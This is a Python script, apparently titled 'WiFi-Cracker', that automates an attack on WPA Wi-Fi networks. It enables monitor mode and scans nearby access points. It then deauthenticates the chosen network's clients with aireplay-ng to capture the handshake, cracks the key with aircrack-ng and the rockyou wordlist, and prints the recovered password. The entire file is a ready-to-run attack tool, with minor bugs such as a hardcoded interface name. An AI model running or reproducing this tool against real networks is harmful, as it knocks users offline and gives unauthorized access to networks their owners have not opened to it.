import subprocess
import csv
import os
import re
from time import sleep
from scapy.all import rdpcap, Dot11

FILE_NAME = "file-01.csv"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def execute(command):
    subprocess.run(command.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_wireless_interfaces():
    result = subprocess.run(['ip', 'link'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    pattern = re.compile(r'^\d+: (wlan\d+|wlp\w+):', re.MULTILINE)
    matches = pattern.findall(result.stdout)
    return matches

def set_device():
    wireless_interfaces = get_wireless_interfaces()
    print("Available Wireless Interfaces")
    for i in range(len(wireless_interfaces)):
        print(f"{i+1}. {wireless_interfaces[i]}")
    
    interface = wireless_interfaces[int(input("Enter the interface number : ")) - 1]

    while True:
        adapter = input("Do you want to add suffix \"mon\" (Default: no): ")
        if (adapter.lower() in ('y', 'yes')):
            interface += "mon"
            break
        elif (adapter.lower() in ('n', 'no', '')):
            break
        else:
            print("Invalid Input. Type 'y, yes, n or no' ")
    
    #Turning monitor mode on
    execute("sudo airmon-ng check kill")
    execute(f"sudo airmon-ng start {interface}")

    return interface

def remove_file(file):
    for files in os.listdir():
        if file in files:
            os.remove(file)

def check_sudo_user():
    if not 'SUDO_UID' in os.environ.keys():
        print("sudo privilige required!!")
        print("Use: sudo python wificracker.py")
        exit()
def check_eapol(file):
    packets = rdpcap(file)
    for packet in packets:
      if packet.haslayer(Dot11) and packet.type == 2:
        if packet.subtype == 4:
          return True
    return False
def banner():
    subprocess.call("clear", shell=True)
    print(
"""
****************************************************************************
*#     #                   #####                                           *
*#  #  # # ###### #       #     # #####    ##    ####  #    # ###### ##### *
*#  #  # # #      #       #       #    #  #  #  #    # #   #  #      #    #*
*#  #  # # #####  # ##### #       #    # #    # #      ####   #####  #    #*
*#  #  # # #      #       #       #####  ###### #      #  #   #      ##### *
*#  #  # # #      #       #     # #   #  #    # #    # #   #  #      #   # *
* ## ##  # #      #        #####  #    # #    #  ####  #    # ###### #    #*
****************************************************************************
"""
    )
def main():

    banner()
    try:     
        check_sudo_user()      #Check for sudo privilige
        remove_file(FILE_NAME) #deleting file to start fresh
        device = set_device()  #setting the the wireless interface 
        

        #Capturing Wifi Packets using airodump-ng
        capture_packets = f"sudo timeout 10 airodump-ng --band abg -w file --write-interval 1 --output-format csv {device}".split()
        subprocess.Popen(capture_packets, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        sleep(1)
        for i in range(10,0,-1):
            sleep(1)
            print(f"Capturing wifi packets.. for {i:02d} seconds", end='\r')

        subprocess.call("clear", shell=True)

        fieldnames = [
            'BSSID',
            'First_time_seen',
            'Last_time_seen',
            'channel',
            'Speed',
            'Privacy',
            'Cipher',
            'Authentication',
            'Power', 'beacons',
            'IV',
            'LAN_IP',
            'ID_length',
            'ESSID',
            'Key'
        ]
        

        active_wireless_networks = []
        with open(FILE_NAME) as csv_h:
            csv_h.seek(0)
            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
            for row in csv_reader:
                if row["BSSID"] == "BSSID":
                    pass
                elif row["BSSID"] == "Station MAC":
                    break
                elif row["ESSID"] != " ":
                    active_wireless_networks.append(row)

        banner()
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index + 1}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")


        while True:
            choice = int(input("Please select a choice from above: ")) - 1
            try:
                if active_wireless_networks[choice]:
                    break
            except:
                print("Please try again.")


        target_bssid = active_wireless_networks[choice]["BSSID"]
        target_essid = active_wireless_networks[choice]["ESSID"].strip().replace(" ", "_")
        channel = active_wireless_networks[choice]["channel"].strip()
        target_file = target_essid+"-01.cap"  
        execute(f"airmon-ng start {device} {channel}")

        banner()

        print(f"Capturing {target_essid} network packets")
        remove_file(target_file)
        capture_packets = f"sudo airodump-ng wlan1 --band abg --bssid {target_bssid} -c {channel} -w {target_essid} --output-format cap".split()
        capture_packets = subprocess.Popen(capture_packets, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print("Deauthenticating clients...")
        deauth = f"timeout 5 aireplay-ng --deauth 0 -a {target_bssid} {device}".split()  
        subprocess.Popen(deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print("Checking for eapol packets.")
        i = 0
        while True:
            sleep(1)        
            if check_eapol(target_file):
                sleep(2)
                #Stoping monitor mode 
                execute("airmon-ng stop device")
                #Starting Network services 
                execute("sudo systemctl start NetworkManager.service")
                break
            if (i % 10 == 0):
                subprocess.Popen(deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            i += 1
            

        print("Cracking using password using rockyoutxt file please wait...")
        execute(f"sudo aircrack-ng {target_file} -w {WORDLIST} -l {target_essid}_password.txt")
        sleep(2)

        try:
            print(f"THE PASSWORD FOR  {target_essid} IS {open(f'{target_essid}_password.txt').read()}")
            remove_file(f"{target_essid}_password.txt")

        except FileNotFoundError:
            print("Could not find the password in rockyoutxt")

        remove_file(target_file)
        
    except:
        print("Error Occured Quiting")
    
    #Cleaning Up Files 
    remove_file(FILE_NAME)

    print("Thank you! Exiting now")
main()
